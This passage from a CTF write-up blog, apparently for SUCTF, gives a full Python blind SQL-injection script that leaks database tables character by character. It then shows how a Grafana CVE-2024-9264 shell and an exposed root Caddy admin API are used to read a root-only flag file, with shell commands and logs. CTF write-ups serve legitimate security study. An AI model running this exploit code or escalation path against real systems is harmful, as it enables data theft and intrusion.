class="string">&quot;nonce&quot;</span>],</span><br><span class="line">            <span class="built_in">str</span>(material[<span class="string">&quot;ts&quot;</span>]),</span><br><span class="line">            material[<span class="string">&quot;seed&quot;</span>],</span><br><span class="line">            material[<span class="string">&quot;salt&quot;</span>],</span><br><span class="line">            UA,</span><br><span class="line">            PROBE,</span><br><span class="line">            out,</span><br><span class="line">        ]</span><br><span class="line">        cp = subprocess.run(cmd, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, timeout=<span class="number">25</span>)</span><br><span class="line">        <span class="keyword">if</span> cp.returncode != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(cp.stderr <span class="keyword">or</span> cp.stdout)</span><br><span class="line"></span><br><span class="line">        data = json.loads(Path(out).read_text(encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(data[<span class="string">&quot;error&quot;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;q&quot;</span>: q,</span><br><span class="line">            <span class="string">&quot;nonce&quot;</span>: material[<span class="string">&quot;nonce&quot;</span>],</span><br><span class="line">            <span class="string">&quot;ts&quot;</span>: material[<span class="string">&quot;ts&quot;</span>],</span><br><span class="line">            <span class="string">&quot;sign&quot;</span>: data[<span class="string">&quot;sign&quot;</span>],</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.unlink(out)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_q</span>(<span class="params">q: <span class="built_in">str</span></span>):</span><br><span class="line">    body = sign_q(q)</span><br><span class="line">    <span class="keyword">return</span> request_json(<span class="string">&quot;POST&quot;</span>, TARGET + <span class="string">&quot;/api/query&quot;</span>, json=body)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">row_count</span>(<span class="params">obj</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>) <span class="keyword">and</span> obj.get(<span class="string">&quot;ok&quot;</span>) <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> <span class="built_in">isinstance</span>(obj.get(<span class="string">&quot;data&quot;</span>), <span class="built_in">list</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(obj[<span class="string">&quot;data&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_true</span>(<span class="params">cond_sql: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用已验证可行的 CASE 布尔 oracle：</span></span><br><span class="line"><span class="string">    条件真 -&gt; 返回空字符串 -&gt; 匹配默认记录</span></span><br><span class="line"><span class="string">    条件假 -&gt; 返回随机串 -&gt; 通常无结果</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    noise = rand_noise()</span><br><span class="line">    payload = <span class="string">f&quot;&#x27; || (CASE WHEN (<span class="subst">&#123;cond_sql&#125;</span>) THEN &#x27;&#x27; ELSE &#x27;<span class="subst">&#123;noise&#125;</span>&#x27; END) || &#x27;&quot;</span></span><br><span class="line">    code, obj = send_q(payload)</span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">403</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;403 on payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;unexpected status=<span class="subst">&#123;code&#125;</span>, body=<span class="subst">&#123;obj&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> row_count(obj) &gt; <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">char_at</span>(<span class="params">expr_sql: <span class="built_in">str</span>, pos: <span class="built_in">int</span>, charset: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    逐字符爆破 expr_sql 的第 pos 位。</span></span><br><span class="line"><span class="string">    先判断是否到字符串结束。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> is_true(<span class="string">f&quot;substr((<span class="subst">&#123;expr_sql&#125;</span>),<span class="subst">&#123;pos&#125;</span>,1)=&#x27;&#x27;&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">if</span> is_true(<span class="string">f&quot;ascii(substr((<span class="subst">&#123;expr_sql&#125;</span>),<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;<span class="built_in">ord</span>(ch)&#125;</span>&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;no charset match for pos=<span class="subst">&#123;pos&#125;</span>, expr=<span class="subst">&#123;expr_sql&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_text</span>(<span class="params">expr_sql: <span class="built_in">str</span>, max_len=<span class="number">120</span>,</span></span><br><span class="line"><span class="params">              charset=string.ascii_letters + string.digits + <span class="string">&quot;_&#123;&#125;-:/. ,|@#()%[]+!?$&amp;&#x27;\&quot;&quot;</span></span>):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_len + <span class="number">1</span>):</span><br><span class="line">        ch = char_at(expr_sql, pos, charset)</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        out += ch</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    [<span class="subst">&#123;pos:02d&#125;</span>] <span class="subst">&#123;out&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">probe_expr</span>(<span class="params">expr_sql: <span class="built_in">str</span></span>):</span><br><span class="line">    payload = <span class="string">f&quot;&#x27; || (<span class="subst">&#123;expr_sql&#125;</span>) || &#x27;&quot;</span></span><br><span class="line">    code, obj = send_q(payload)</span><br><span class="line">    <span class="keyword">return</span> code, obj</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_table_col</span>(<span class="params">table: <span class="built_in">str</span>, col: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    通过 &#x27;|| (SELECT min(col) FROM table) ||&#x27; 测试表/列是否存在。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    code, obj = probe_expr(<span class="string">f&quot;SELECT min(<span class="subst">&#123;col&#125;</span>) FROM <span class="subst">&#123;table&#125;</span>&quot;</span>)</span><br><span class="line">    msg = json.dumps(obj, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> code == <span class="number">403</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;blocked&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">f&#x27;relation &quot;<span class="subst">&#123;table&#125;</span>&quot; does not exist&#x27;</span> <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;no-table&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">f&#x27;column &quot;<span class="subst">&#123;col&#125;</span>&quot; does not exist&#x27;</span> <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;no-column&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>) <span class="keyword">and</span> obj.get(<span class="string">&quot;ok&quot;</span>) <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>, msg[:<span class="number">200</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_min_ordered</span>(<span class="params">table: <span class="built_in">str</span>, col: <span class="built_in">str</span>, limit_rows=<span class="number">8</span>, max_len=<span class="number">140</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    按字典序逐条泄露：</span></span><br><span class="line"><span class="string">      第一条: SELECT min(col) FROM table</span></span><br><span class="line"><span class="string">      第二条: SELECT min(col) FROM table WHERE col &gt; &#x27;上一条&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Dumping ordered <span class="subst">&#123;table&#125;</span>.<span class="subst">&#123;col&#125;</span> ...&quot;</span>)</span><br><span class="line">    vals = []</span><br><span class="line">    prev = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, limit_rows + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> prev <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            expr = <span class="string">f&quot;(SELECT min(<span class="subst">&#123;col&#125;</span>) FROM <span class="subst">&#123;table&#125;</span>)&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            expr = <span class="string">f&quot;(SELECT min(<span class="subst">&#123;col&#125;</span>) FROM <span class="subst">&#123;table&#125;</span> WHERE <span class="subst">&#123;col&#125;</span> &gt; (<span class="subst">&#123;qstr(prev)&#125;</span>))&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            val = leak_text(expr, max_len=max_len)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    stop at row <span class="subst">&#123;idx&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> val:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;table&#125;</span>.<span class="subst">&#123;col&#125;</span>[<span class="subst">&#123;idx&#125;</span>] = <span class="subst">&#123;val&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> val <span class="keyword">in</span> vals:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        vals.append(val)</span><br><span class="line">        prev = val</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vals</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_single_expr</span>(<span class="params">name: <span class="built_in">str</span>, expr: <span class="built_in">str</span>, max_len=<span class="number">160</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Leaking <span class="subst">&#123;name&#125;</span>: <span class="subst">&#123;expr&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        val = leak_text(expr, max_len=max_len)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;name&#125;</span> = <span class="subst">&#123;val&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] leak <span class="subst">&#123;name&#125;</span> failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Target: <span class="subst">&#123;TARGET&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] WASM dir: <span class="subst">&#123;WASM_DIR&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Baseline:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(send_q(<span class="string">&quot;test&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Basic verified probes ...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> name, q <span class="keyword">in</span> [</span><br><span class="line">        (<span class="string">&quot;concat_empty&quot;</span>, <span class="string">&quot;&#x27; || &#x27;&#x27; || &#x27;&quot;</span>),</span><br><span class="line">        (<span class="string">&quot;posts_title_min&quot;</span>, <span class="string">&quot;&#x27; || (SELECT min(title) FROM posts) || &#x27;&quot;</span>),</span><br><span class="line">        (<span class="string">&quot;secrets_id_min&quot;</span>, <span class="string">&quot;&#x27; || (SELECT min(id) FROM secrets) || &#x27;&quot;</span>),</span><br><span class="line">    ]:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    <span class="subst">&#123;name&#125;</span>: <span class="subst">&#123;send_q(q)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    <span class="subst">&#123;name&#125;</span>: fail -&gt; <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Confirm current_database() ...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        db = dump_single_expr(<span class="string">&quot;db&quot;</span>, <span class="string">&quot;current_database()&quot;</span>, max_len=<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] db leak failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        db = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Scanning posts columns ...&quot;</span>)</span><br><span class="line">    posts_cols = [</span><br><span class="line">        <span class="string">&quot;id&quot;</span>, <span class="string">&quot;title&quot;</span>, <span class="string">&quot;status&quot;</span>, <span class="string">&quot;content&quot;</span>, <span class="string">&quot;body&quot;</span>, <span class="string">&quot;text&quot;</span>, <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;value&quot;</span>, <span class="string">&quot;secret&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    good_posts = []</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> posts_cols:</span><br><span class="line">        ok, why = test_table_col(<span class="string">&quot;posts&quot;</span>, col)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    posts.<span class="subst">&#123;col&#125;</span>: <span class="subst">&#123;why&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> ok:</span><br><span class="line">            good_posts.append(col)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Working posts columns: <span class="subst">&#123;good_posts&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;title&quot;</span> <span class="keyword">in</span> good_posts:</span><br><span class="line">        dump_min_ordered(<span class="string">&quot;posts&quot;</span>, <span class="string">&quot;title&quot;</span>, limit_rows=<span class="number">6</span>, max_len=<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;status&quot;</span> <span class="keyword">in</span> good_posts:</span><br><span class="line">        dump_min_ordered(<span class="string">&quot;posts&quot;</span>, <span class="string">&quot;status&quot;</span>, limit_rows=<span class="number">6</span>, max_len=<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Scanning secrets columns ...&quot;</span>)</span><br><span class="line">    secrets_cols = [</span><br><span class="line">        <span class="string">&quot;id&quot;</span>, <span class="string">&quot;title&quot;</span>, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>, <span class="string">&quot;secret&quot;</span>, <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content&quot;</span>, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;memo&quot;</span>, <span class="string">&quot;note&quot;</span>, <span class="string">&quot;status&quot;</span>, <span class="string">&quot;path&quot;</span>, <span class="string">&quot;url&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    good_secrets = []</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> secrets_cols:</span><br><span class="line">        ok, why = test_table_col(<span class="string">&quot;secrets&quot;</span>, col)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    secrets.<span class="subst">&#123;col&#125;</span>: <span class="subst">&#123;why&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> ok:</span><br><span class="line">            good_secrets.append(col)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Working secrets columns: <span class="subst">&#123;good_secrets&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 先尝试最可能出 flag 的列</span></span><br><span class="line">    priority = [<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;value&quot;</span>, <span class="string">&quot;secret&quot;</span>, <span class="string">&quot;content&quot;</span>, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;memo&quot;</span>, <span class="string">&quot;note&quot;</span>, <span class="string">&quot;title&quot;</span>, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;key&quot;</span>, <span class="string">&quot;status&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> priority:</span><br><span class="line">        <span class="keyword">if</span> col <span class="keyword">in</span> good_secrets:</span><br><span class="line">            vals = dump_min_ordered(<span class="string">&quot;secrets&quot;</span>, col, limit_rows=<span class="number">8</span>, max_len=<span class="number">200</span>)</span><br><span class="line">            <span class="keyword">for</span> v <span class="keyword">in</span> vals:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;SUCTF&#123;&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[FLAG] <span class="subst">&#123;v&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 再尝试 posts 里可能隐藏 flag 的 title/status</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> [<span class="string">&quot;title&quot;</span>, <span class="string">&quot;status&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> col <span class="keyword">in</span> good_posts:</span><br><span class="line">            vals = dump_min_ordered(<span class="string">&quot;posts&quot;</span>, col, limit_rows=<span class="number">8</span>, max_len=<span class="number">140</span>)</span><br><span class="line">            <span class="keyword">for</span> v <span class="keyword">in</span> vals:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;SUCTF&#123;&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[FLAG] <span class="subst">&#123;v&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Finished. If no flag printed, inspect dumped secrets.* values first.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="D:\blog\xiaolaisecBlog\source\images\image-20260314111133319.png"
+                      alt="image-20260314111133319"
+                ></p>
+<h2 id="SU-Thief"><a href="#SU-Thief" class="headerlink" title="SU_Thief"></a>SU_Thief</h2><p>弱口令</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20260314152449006.png"
+                      alt="image-20260314152449006"
+                ></p>
+<p>CVE-2024-9264-RCE，参考链接<a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2549712" >https://cloud.tencent.com/developer/article/2549712 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20260314152637943.png"
+                      alt="image-20260314152637943"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20260314152707248.png"
+                      alt="image-20260314152707248"
+                ></p>
+<p>**利用 root 身份运行的 Caddy 直接读 <code>/root/flag</code>**。<br> 日志里最关键的是：<code>localhost:2019</code> 的 Caddy <strong>admin API 开着</strong>，而且 <code>enforce_origin:false</code>，当前有 grafana shell，就能直接从本机去改 Caddy 配置</p>
+<p>思路：</p>
+<ul>
+<li><strong>Caddy 是 root 跑的</strong></li>
+<li><strong>Caddy admin API 在 <code>127.0.0.1:2019</code> 开着</strong></li>
+<li>日志显示：<ul>
+<li><code>enforce_origin:false</code></li>
+<li>周期性有 <code>curl/7.81.0</code> 对 <code>/load</code> 发 <code>POST</code></li>
+</ul>
+</li>
+<li>所以可以<strong>从本机直接改 Caddy 配置</strong>，让 root 身份的 Caddy 去读 <code>/root/flag</code></li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20260314160155587.png"
+                      alt="image-20260314160155587"
+                ></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/caddy/caddy_config.json</span></span><br><span class="line">&#123;</span><br><span class="line">    &quot;apps&quot;: &#123;</span><br><span class="line">        &quot;http&quot;: &#123;</span><br><span class="line">            &quot;servers&quot;: &#123;</span><br><span class="line">                &quot;srv0&quot;: &#123;</span><br><span class="line">                    &quot;listen&quot;: [&quot;:80&quot;],</span><br><span class="line">                    &quot;routes&quot;: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            &quot;handle&quot;: [</span><br><span class="line">                                &#123;</span><br><span class="line">                                    &quot;handler&quot;: &quot;reverse_proxy&quot;,</span><br><span class="line">                                    &quot;upstreams&quot;: [</span><br><span class="line">                                        &#123;</span><br><span class="line">                                            &quot;dial&quot;: &quot;127.0.0.1:3000&quot;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">tail</span> -n 100 /var/log/caddy.log 2&gt;/dev/null</span></span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470763.8899055,&quot;logger&quot;:&quot;admin&quot;,&quot;msg&quot;:&quot;stopped previous server&quot;,&quot;address&quot;:&quot;localhost:2019&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470770.0844364,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;localhost:2019&quot;,&quot;uri&quot;:&quot;/config/&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;58410&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip&quot;],&quot;User-Agent&quot;:[&quot;Grafana/11.0.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;8.218.161.89, 127.0.0.1, 127.0.0.1&quot;],&quot;X-Grafana-Referer&quot;:[&quot;&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470776.53802,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;DELETE&quot;,&quot;host&quot;:&quot;localhost:2019&quot;,&quot;uri&quot;:&quot;/config/apps/http/servers/srv0/routes/0&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;58410&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip&quot;],&quot;User-Agent&quot;:[&quot;Grafana/11.0.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;8.217.31.170, 127.0.0.1, 127.0.0.1&quot;],&quot;X-Grafana-Referer&quot;:[&quot;&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773470776.5391705,&quot;logger&quot;:&quot;admin&quot;,&quot;msg&quot;:&quot;admin endpoint started&quot;,&quot;address&quot;:&quot;localhost:2019&quot;,&quot;enforce_origin&quot;:false,&quot;origins&quot;:[&quot;//localhost:2019&quot;,&quot;//[::1]:2019&quot;,&quot;//127.0.0.1:2019&quot;]&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;warn&quot;,&quot;ts&quot;:1773470776.5394576,&quot;logger&quot;:&quot;http.auto_https&quot;,&quot;msg&quot;:&quot;server is listening only on the HTTP port, so no automatic 